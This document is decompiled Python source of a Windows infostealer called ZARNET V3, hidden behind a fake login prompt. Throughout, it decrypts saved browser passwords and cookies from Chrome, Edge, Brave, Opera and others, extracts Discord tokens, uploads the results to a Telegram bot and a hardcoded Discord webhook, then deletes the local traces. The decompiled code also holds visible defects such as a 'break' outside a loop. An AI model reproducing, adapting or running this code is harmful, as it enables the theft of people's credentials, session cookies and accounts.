# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: ZARNET-V3-FREE.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import getpass
import os
import time
import re
from base64 import b64decode
from json import loads
from shutil import copy2
from sqlite3 import connect
import win32crypt
from Cryptodome.Cipher import AES
from requests import post
username = 'free'
password = 'projectzar'
os.system('cls')
os.system('title ZARNET V3 (FREE)')
input_username = input('Username: ')
input_password = getpass.getpass('Password: ')
if input_username == username and input_password == password:
    time.sleep(1)
    os.system('cls')
    print('Checking if username and password valid.')
    time.sleep(1)
    os.system('cls')
    print('Checking if username and password valid..')
    time.sleep(1)
    os.system('cls')
    print('Checking if username and password valid...')
    time.sleep(1)
    os.system('cls')
    print('Checking if username and password valid...')
    time.sleep(1)
    os.system('cls')
    print('Checking if username and password valid.')
    time.sleep(1)
    os.system('cls')
    print('Checking if username and password valid..')
    time.sleep(1)
    os.system('cls')
    print('Welcome back')
    local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
tokenPaths = {'Discord': f'{roaming}\\Discord', 'Discord Canary': f'{roaming}\\discordcanary', 'Discord PTB': f'{roaming}\\discordptb', 'Google Chrome': f'{local}\\Google\\Chrome\\User Data\\Default', 'Opera': f'{roaming}\\Opera Software\\Opera Stable', 'Brave': f'{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Yandex': f'{local}\\Yandex\\YandexBrowser\\User Data\\Default', 'OperaGX': f'{roaming}\\Opera Software\\Opera GX Stable'}
browser_loc = {'Chrome': f'{local}\\Google\\Chrome', 'Brave': f'{local}\\BraveSoftware\\Brave-Browser', 'Edge': f'{local}\\Microsoft\\Edge', 'Opera': f'{roaming}\\Opera Software\\Opera Stable', 'OperaGX': f'{roaming}\\Opera Software\\Opera GX Stable'}
fileCookies = 'cooks_' + os.getlogin() + '.txt'
filePass = 'passes_' + os.getlogin() + '.txt'
fileInfo = 'info_' + os.getlogin() + '.txt'
for i in os.listdir(browser_loc['Chrome'] + '\\User Data'):
    if i.startswith('Profile '):
        browser_loc['ChromeP'] = f'{local}\\Google\\Chrome\\User Data\\{i}'

def decrypt_token(buff, master_key):
    try:
        return AES.new(win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return None

def get_tokens(path):
    cleaned = []
    tokens = []
    done = []
    lev_db = f'{path}\\Local Storage\\leveldb\\'
    loc_state = f'{path}\\Local State'
    if os.path.exists(loc_state):
        with open(loc_state, 'r') as file:
            key = loads(file.read())['os_crypt']['encrypted_key']
        for file in os.listdir(lev_db):
            if not file.endswith('.ldb') and file.endswith('.log'):
                continue
            try:
                with open(lev_db + file, 'r', errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*', x):
                            tokens.append(values)
            except PermissionError:
                continue
        for i in tokens:
            if i.endswith('\\'):
                i.replace('\\', '')
            elif i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            done += [decrypt_token(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])]
        return done
    else:
        for file_name in os.listdir(path):
            try:
                if not file_name.endswith('.log') and (not file_name.endswith('.ldb')):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in ['[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', 'mfa\\.[\\w-]{84}']:
                        for token in re.findall(regex, line):
                            done.append(token)
            except:
                continue
        return done

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def decrypt_browser(LocalState, LoginData, CookiesFile, name):
    if os.path.exists(LocalState):
        with open(LocalState) as f:
            local_state = f.read()
            local_state = loads(local_state)
        master_key = b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        if os.path.exists(LoginData):
            copy2(LoginData, 'TempMan.db')
            with connect('TempMan.db') as conn:
                cur = conn.cursor()
            cur.execute('SELECT origin_url, username_value, password_value FROM logins')
            with open(filePass, 'a') as f:
                f.write(f'*** {name} ***\n')
            for index, logins in enumerate(cur.fetchall()):
                try:
                    if not logins[0]:
                        continue
                    if not logins[1]:
                        continue
                    if not logins[2]:
                        continue
                    ciphers = logins[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {logins[0]}\nName: {logins[1]}\nPass: {dec_pass}\n\n'
                    with open(filePass, 'a') as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    pass
        else:
            with open(fileInfo, 'a') as f:
                f.write(f'{name} Login Data file missing\n')
        if os.path.exists(CookiesFile):
            copy2(CookiesFile, 'CookMe.db')
            with connect('CookMe.db') as conn:
                curr = conn.cursor()
            curr.execute('SELECT host_key, name, encrypted_value, expires_utc FROM cookies')
            with open(fileCookies, 'a') as f:
                f.write(f'*** {name} ***\n')
            for index, cookies in enumerate(curr.fetchall()):
                try:
                    if not cookies[0]:
                        continue
                    if not cookies[1]:
                        continue
                    if not cookies[2]:
                        continue
                    if 'google' in cookies[0]:
                        continue
                    ciphers = cookies[2]
                    init_vector = ciphers[3:15]
                    enc_pass = ciphers[15:-16]
                    cipher = generate_cipher(master_key, init_vector)
                    dec_pass = decrypt_payload(cipher, enc_pass).decode()
                    to_print = f'URL : {cookies[0]}\nName: {cookies[1]}\nCook: {dec_pass}\n\n'
                    with open(fileCookies, 'a') as f:
                        f.write(to_print)
                except (Exception, FileNotFoundError):
                    continue
        else:
            with open(fileInfo, 'a') as f:
                f.write(f'no {name} Cookie file\n')
    else:
        with open(fileInfo, 'a') as f:
            f.write(f'{name} Local State file missing\n')

def Local_State(path):
    return f'{path}\\User Data\\Local State'

def Login_Data(path):
    if 'Profile' in path:
        return f'{path}\\Login Data'
    return f'{path}\\User Data\\Default\\Login Data'

def Cookies(path):
    if 'Profile' in path:
        return f'{path}\\Network\\Cookies'
    return f'{path}\\User Data\\Default\\Network\\Cookies'

def main_tokens():
    for platform, path in tokenPaths.items():
        if not os.path.exists(path):
            continue
        try:
            tokens = set(get_tokens(path))
        except:
            continue
        if not tokens:
            continue
        with open(fileInfo, 'a') as f:
            for i in tokens:
                f.write(str(i) + '\n')

def decrypt_files(path, browser):
    if os.path.exists(path):
        decrypt_browser(Local_State(path), Login_Data(path), Cookies(path), browser)
    else:
        with open(fileInfo, 'a') as f:
            f.write(browser + ' not installed\n')

def post_to(file):
    token = 'TELEGRAM TOKEN'
    chat_id = 'TELEGRAM CHATID'
    webhook_url = 'https://discordapp.com/api/webhooks/1064912078109950012/8ivMZ_n2U3xBFKk9SuTIGZLtuUh8Y93fQ1KaP_GDbCKKOI7MPb57W9y_aBDgi-66JKbv'
    if token == 'TELEGRAM TOKEN':
        break
    if chat_id == 'TELEGRAM CHATID':
        break
    post('https://api.telegram.org/bot' + token + '/sendDocument', data={'chat_id': chat_id}, files={'document': open(file, 'rb')})
    if webhook_url == 'WEBHOOK URL':
        return
    post(webhook_url, files={'files': open(file, 'rb')})
for_handler = (fileInfo, filePass, fileCookies, 'TempMan.db', 'CookMe.db')

def file_handler(file):
    if os.path.exists(file):
        if '.txt' in file:
            post_to(file)
        os.remove(file)

def main():
    for name, path in browser_loc.items():
        decrypt_files(path, name)
    main_tokens()
    for i in for_handler:
        file_handler(i)
main()